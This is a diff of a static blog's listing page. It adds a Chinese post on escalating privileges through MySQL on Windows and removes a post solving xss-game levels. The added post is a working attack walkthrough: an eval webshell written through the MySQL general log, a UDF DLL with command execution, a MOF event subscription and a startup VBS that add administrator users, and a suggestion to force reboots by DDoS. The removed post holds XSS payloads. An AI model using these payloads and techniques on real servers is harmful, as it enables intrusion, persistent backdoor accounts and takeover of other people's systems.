@@ -90,6 +90,133 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2018/09/08/基于Windows下mysql的一些提权分析/"> 
+                    基于Windows下mysql的一些提权分析 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-09-08   
+                </a>
+                
+                
+                
+                    
+            </div>
+            <div class="content">
+                
+                <h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p>这篇文章是写基于windows环境下的一些mysql提权方法的分析并利用。这些方法老生常谈，但困于很多文章在讲分析和利用的时候模棱两可，因此想总结一下常见的方法思路。基于windows的提权姿势多的数不胜数，一般在配置文件可以嗅探到root密码的情况（root密码已知）下，或者注入、爆破拿到root密码下，可以考虑mysql提权。文章内容很基础，下面对这些方法进行一些粗谈，有什么理解错误的地方还请客观们轻打…大佬们可以略过这篇文章qaq…</p>
+<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>靶机A： Windows 7 SP1<br>靶机B： Windows server 2003 enterprise x64<br>Phpstudy搭建的php+mysql<br>php版本：5.4.45<br>mysql版本：5.5.53<br>攻击环境：已知root账号密码，网站存在phpmyadmin页面</p>
+<h1 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>利用log变量，猜一下绝对路径<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224310-0a604df6-9987-1.png" alt><br>看到phpstudy，猜测根目录在WWW下，into outfile写个马测一下能传不<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224334-18b3e6b0-9987-1.png" alt><br>果然是用不成into outfile，因为file_priv为null，那么尝试使用日志写马</p>
+<h2 id="利用日志写shell"><a href="#利用日志写shell" class="headerlink" title="利用日志写shell"></a>利用日志写shell</h2><p>开启日志记录</p>
+<pre><code>set global general_log=&#39;on&#39;;</code></pre><p>日志文件导出指定目录</p>
+<pre><code>set global general_log_file=&#39;C:/phpstudy/WWW/hp.php&#39;;</code></pre><p>记录sql语句写马，这里我就是演示一下，没有安全狗，直接传原马</p>
+<pre><code>select &#39;&lt;?php @eval($_POST[&quot;hp&quot;]); ?&gt;&#39;;</code></pre><p>关闭记录</p>
+<pre><code>set global general_log=off;</code></pre><h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>url: 192.168.11.106/hp.php<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224350-22085dea-9987-1.png" alt><br>看一下权限，普通成员hpd0egr，创建用户错误5。<br>接下来开始提权之路！</p>
+<h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><h2 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h2><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
+<h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><p>先学习一下什么叫动态链接库</p>
+<h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
+<h3 id="提权分析"><a href="#提权分析" class="headerlink" title="提权分析"></a>提权分析</h3><p>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
+<h2 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>这里我用暗月的马，改了一些参数。后面我会把所有工具打包</p>
+<h3 id="访问提权马"><a href="#访问提权马" class="headerlink" title="访问提权马"></a>访问提权马</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224415-309ea058-9987-1.png" alt></p>
+<h3 id="导出dll到指定目录"><a href="#导出dll到指定目录" class="headerlink" title="导出dll到指定目录"></a>导出dll到指定目录</h3><p>利用提权马将写在其中的二进制导出一个dll到指定目录，但导出的dll文件路径有要求</p>
+<ul>
+<li><p>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p>
+</li>
+<li><p>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p>
+</li>
+</ul>
+<p><strong>但是大于5.1版本的时候没有plugin这个文件夹，需要我们自己创建。</strong></p>
+<p>靶机mysql版本为5.5，那我们只能自己创建一个plugin文件夹了，先用<code>select @@basedir;</code>获取安装目录。</p>
+<p>在该目录下创建一个plugin文件夹，网上有大神说可以用ntfs创建目录，感兴趣的话可以研究一下，我这里直接菜刀新建</p>
+<p>这个提权马自带的导出要用到Into dumpfile，但是file_priv为Null这个问题限制了我们，就算我们修改了my.ini文件也要重启mysql，那我们直接传一个dll上去吧，文件名为<code>hpudf.dll</code>如图</p>
+<h3 id="将udf的自定义函数引入"><a href="#将udf的自定义函数引入" class="headerlink" title="将udf的自定义函数引入"></a>将udf的自定义函数引入</h3><p>我们刚才只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
+<p>引入sys_eval函数：</p>
+<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;hpudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，hpudf.dll是你导出文件的名字;</p>
+<p>常见的函数如下：</p>
+<pre><code>cmdshell 执行cmd;
+
+downloader 下载者,到网上下载指定文件并保存到指定目录;
+
+open3389 通用开3389终端服务,可指定端口(不改端口无需重启);
+
+backshell 反弹Shell;
+
+ProcessView 枚举系统进程;
+
+KillProcess 终止指定进程;
+
+regread 读注册表;
+
+regwrite 写注册表;
+
+shut 关机,注销,重启;
+
+about 说明与帮助函数;</code></pre><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令模板：</p>
+<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>添加用户/管理员<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224507-4fc7644c-9987-1.png" alt></p>
+<p>查看一下用户<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224525-5ad82b8c-9987-1.png" alt></p>
+<p>get it~</p>
+<h1 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h1><p>MOF提权的条件要求十分严苛：</p>
+<ol>
+<li>windows 03及以下版本</li>
+<li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li>
+<li>secure-file-priv参数不为null</li>
+</ol>
+<p>mysql以root身份启动，具有c盘下system32/wbem/mof这点权限的要求，就已经非常严格了。。而且win7 sp1就已经没有这个nullevt.mof这个文件了，那么这里记一下poc，来对windows 03的机子进行验证。</p>
+<h2 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h2><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。</p>
+<h2 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h2><p>MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
+<h2 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h2><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
+instance of __EventFilter as $EventFilter
+{
+EventNamespace = &quot;Root\\Cimv2&quot;;
+Name = &quot;filtP2&quot;;
+Query = &quot;Select * From __InstanceModificationEvent &quot;
+&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
+&quot;And TargetInstance.Second = 5&quot;;
+QueryLanguage = &quot;WQL&quot;;
+};
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = &quot;consPCSV2&quot;;
+ScriptingEngine = &quot;JScript&quot;;
+ScriptText =
+&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;
+};
+instance of __FilterToConsumerBinding
+{
+Consumer = $Consumer;
+Filter = $EventFilter;
+};</code></pre><h2 id="MOF文件利用"><a href="#MOF文件利用" class="headerlink" title="MOF文件利用"></a>MOF文件利用</h2><p>将上面的脚本上传到有读写权限的目录下：</p>
+<p>这里我上传到了<code>C:\Documents and Settings\test</code></p>
+<p>根据前面的phpmyadmin，我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下<br>payload:</p>
+<pre><code>select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</p>
+<h2 id="验证提权"><a href="#验证提权" class="headerlink" title="验证提权"></a>验证提权</h2><p>当我们成功把mof导出时，mof就会直接被执行，且5秒创建一次用户。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224611-75eaad5a-9987-1.png" alt><br>可以看到，我们在test的普通用户下直接添加了hpdoger用户。剩下的操作就是用户命令处，换成加入administrator语句即可：</p>
+<pre><code>net.exe user localgroup administrator hpdoger /add\</code></pre><h2 id="关于Mof提权的弊端"><a href="#关于Mof提权的弊端" class="headerlink" title="关于Mof提权的弊端"></a>关于Mof提权的弊端</h2><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p>
+<p>cmd 下运行下面语句:</p>
+<pre><code>net stop winmgmt
+del c:/windows/system32/wbem/repository
+net start winmgmt</code></pre><p>重启服务即可。</p>
+<h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><p>在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和mof几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用mysql写文件，写入一段VBS代码到开机自启动中，服务器重启达到创建用户并提权，可以使用DDOS迫使服务器重启。</p>
+<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><p>file_priv 不为null<br>已知root密码</p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>create table a (cmd text); 
+insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); 
+insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); 
+insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); 
+select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有很多cve这里没有复现到。Mysql提权在如今被各种因素限制，但掌握这一门技术或多或少对我们都还是有所帮助的</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/09/08/基于Windows下mysql的一些提权分析/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/"> 
                     Phpstorm + phpstudy + Xdebug代码审计环境 
                 </a>
@@ -147,7 +274,7 @@ xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.
             </div>
             <div class="continue">
             <a href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -196,7 +323,7 @@ xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.
             </div>
             <div class="continue">
             <a href="/2018/08/23/Csrf in YFCMF 3.0/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -239,7 +366,7 @@ xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.
             </div>
             <div class="continue">
             <a href="/2018/08/23/Arbitrary File upload in Semcms V2.7/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -495,7 +622,7 @@ if __name__ == &#39;__main__&#39;:
             </div>
             <div class="continue">
             <a href="/2018/08/21/Dedecms V5.7 SP2代码审计/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -647,7 +774,7 @@ if __name__ == &#39;__main__&#39;:
             </div>
             <div class="continue">
             <a href="/2018/08/18/代码审计复现：Bluecms 1.6/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -758,7 +885,7 @@ if __name__ == &#39;__main__&#39;:
             </div>
             <div class="continue">
             <a href="/2018/08/12/（转载） 基于 Token 的身份验证/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -865,7 +992,7 @@ if(empty($port)){
             </div>
             <div class="continue">
             <a href="/2018/08/10/初探ssrf/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -921,7 +1048,7 @@ s.connect()</code></pre><p>2、 连接后发送数据和接收数据</p>
             </div>
             <div class="continue">
             <a href="/2018/08/08/Socket套接字编程学习/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1049,62 +1176,7 @@ if (!in_array($ext,$allowtype)){
             </div>
             <div class="continue">
             <a href="/2018/08/07/LFI with phpinfo测试/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/06/xss从零开始（三）之怒刷google-xss/"> 
-                    xss从零开始（三）之怒刷google-xss 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-06   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>xss太好玩了，刷题刷题~</p>
-<h2 id="level-1-easypass"><a href="#level-1-easypass" class="headerlink" title="level 1 easypass"></a>level 1 easypass</h2><p>地址：<a href="https://xss-game.appspot.com/level1" target="_blank" rel="noopener">https://xss-game.appspot.com/level1</a><br>easy</p>
-<pre><code>&lt;script&gt;alert(1)&lt;/alert&gt;</code></pre><h2 id="level-2-img标签-事件绕过"><a href="#level-2-img标签-事件绕过" class="headerlink" title="level 2 img标签+事件绕过"></a>level 2 img标签+事件绕过</h2><p>地址：<a href="https://xss-game.appspot.com/level2" target="_blank" rel="noopener">https://xss-game.appspot.com/level2</a></p>
-<p>过滤script标签，用事件绕过</p>
-<pre><code>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</code></pre><h2 id="level-3-window-location-hash"><a href="#level-3-window-location-hash" class="headerlink" title="level 3 window.location.hash"></a>level 3 window.location.hash</h2><p>地址：<a href="https://xss-game.appspot.com/level3" target="_blank" rel="noopener">https://xss-game.appspot.com/level3</a></p>
-<p><img src="https://s1.ax1x.com/2018/08/04/PBXJRU.jpg" alt><br>看到url里，有“#”号，联想window.location.hash<br>那么什么是window.location.hash呢?</p>
-<p><a href="https://www.cnblogs.com/china-aspx/archive/2008/04/20/1162597.html" target="_blank" rel="noopener">window.location.hash属性介绍</a><br>location是javascript里边管理地址栏的内置对象，比如location.href就管理页面的url，用location.href=url就可以直接将页面重定向url。而location.hash则可以用来获取或设置页面的标签值。比如<a href="http://domain/#admin的location.hash=&quot;#admin&quot;。利用这个属性值可以做一个非常有意义的事情。" target="_blank" rel="noopener">http://domain/#admin的location.hash=&quot;#admin&quot;。利用这个属性值可以做一个非常有意义的事情。</a></p>
-<p>也就是说页面会截取#后面的内容，再将这个值替换到url里进行重定向，这里提交一句话分析一下</p>
-<p><img src="https://s1.ax1x.com/2018/08/04/PBXYzF.png" alt><br>如果我们以单引号结尾，我们猜测这个页面会截取单引号前面的内容并把它闭合到src的双引号里。并且在后面的jpg后再追加一个单引号。既然能脱离单引号，一切都好办了，我们用on事件构造：</p>
-<pre><code>4&#39; onerror=&quot;alert(1)&quot;</code></pre><p>成功弹框</p>
-<h2 id="level4-编码绕过"><a href="#level4-编码绕过" class="headerlink" title="level4 编码绕过"></a>level4 编码绕过</h2><p>地址：<a href="https://xss-game.appspot.com/level4" target="_blank" rel="noopener">https://xss-game.appspot.com/level4</a></p>
-<p>题目给了一个自己写的js函数叫做startime，执行时会进行相应的延时<br>函数的闭合如图:<br><img src="https://s1.ax1x.com/2018/08/04/PBXNM4.png" alt></p>
-<p>思路是在onload事件里构造语句，出现弹框，但是过滤了分号，那么我们可以用URL编码来代替分号</p>
-<pre><code>1&#39;)%3Balert(&#39;1</code></pre><p>还有两种思路：</p>
-<pre><code>1&#39;) || alert(&#39;1</code></pre><p>也可以用下面这种方法，不需要任何编码/操作符：</p>
-<pre><code>1&#39;);alert(1);//</code></pre><p>我尝试用html编码绕，但是过滤了&amp;和#</p>
-<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>地址：<a href="https://xss-game.appspot.com/level5" target="_blank" rel="noopener">https://xss-game.appspot.com/level5</a></p>
-<p>这题看提示，注意singup页面的url<br><img src="https://s1.ax1x.com/2018/08/04/PBXaL9.jpg" alt></p>
-<p>singup页面还看到了next按钮，查看元素发现：<br><img src="https://s1.ax1x.com/2018/08/04/PBXUsJ.png" alt><br>奥，事情不简单，我们传入一个next值，然后重定向给href属性。果断用javascript伪协议<br>payload:</p>
-<pre><code>?next=javascript:alert(1)</code></pre><p>弹框~</p>
-<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>地址：<a href="https://xss-game.appspot.com/level6" target="_blank" rel="noopener">https://xss-game.appspot.com/level6</a></p>
-<p>这题会截取#以后的内容，加载到一个新的script标签里的src属性内。我认为是引入一个js脚本的意思。如图<br><img src="https://s1.ax1x.com/2018/08/04/PBXwZR.png" alt></p>
-<p>这里利用DATA URI Scheme来执行js代码</p>
-<pre><code>http://xss-game.appspot.com/level6/frame#data:text/javascript,alert(1);</code></pre>
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/06/xss从零开始（三）之怒刷google-xss/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1112,7 +1184,7 @@ if (!in_array($ext,$allowtype)){
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/page/3/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
   </nav>
 
     </main>
